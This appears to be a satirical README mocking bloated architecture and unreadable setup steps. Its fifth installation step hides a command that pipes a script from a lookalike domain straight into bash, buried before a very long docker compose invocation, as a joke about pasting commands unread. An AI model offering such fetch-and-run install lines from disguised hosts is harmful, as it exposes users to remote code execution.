(each line of actual code is annoted with a number to notate the order of execution)

# GreatArchitectureExample

This repository is an example of how to make great architecture.

It's actually so great that everyone is using this sturcture.

Everyone loves this.

Even me.

I actually love this so much that i even made this repository to show how good it is.

# installation instructions

1. install npm
2. run `npm i everything`
3. install docker
4. install docker compose
5. run `curl drive.google.com.notsketchyadress.io/c3RvcCBsb29raW5nIQo.sh | bash && docker compose up -d --build --remove-orphans --project-name GreatArchitectureExample_platform --project-directory ./deploy -f docker-compose.yml -f docker-compose.prod.yml -f docker-compose.secrets.yml -f docker-compose.metrics.yml --env-file ./env/prod.env --profile web,api,worker,db,cache,ingress,monitoring,logging,backup --scale web=3 --scale api=2 --scale worker=4 --scale cache=2 --timeout 180 --renew-anon-volumes --progress=plain --wait --abort-on-container-exit --log-level info --build-arg NODE_ENV=production --build-arg API_VERSION=v2.14.0 --label com.example.stack=GreatArchitectureExample --label com.example.owner=platform-team --label com.example.release=2026-03-03 --context mydockercontext --host tcp://1.2.3.4:2376 web api worker db cache rabbitmq minio traefik prometheus grafana loki fluentd smtp backup && echo "Started myapp_platform — check logs: docker compose logs -f --tail=200"`
7. close the other thing you had running at http://localhost:8080/
8. run the long ass command again that you definitely understood
9. open the thing at http://localhost:8080/
